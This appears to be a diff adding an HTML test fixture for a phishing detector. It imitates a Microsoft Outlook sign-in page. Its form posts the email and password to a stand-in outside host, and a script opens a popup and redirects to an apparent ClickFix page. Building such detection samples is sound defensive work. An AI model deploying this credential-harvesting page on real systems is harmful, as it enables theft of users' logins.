@@ -1,0 +1,15 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>Sign in to your Microsoft account</title></head>
+<body>
+<h1>Microsoft</h1><p>Sign in to continue to Outlook. Office 365 secure portal.</p>
+<!-- Benign fixture: the form posts credentials to another domain (ANA-4). -->
+<form action="https://collector.example.net/submit.php" method="post">
+  <input type="email" name="loginfmt" autocomplete="username" style="">
+  <input type="password" name="passwd" autocomplete="current-password" style="">
+  <button type="submit">Sign in</button>
+</form>
+<script>
+  window.open('/popup.html', '_blank');
+  setTimeout(function () { location.href = '/clickfix.html'; }, 1500);
+</script>
+
+</body></html>
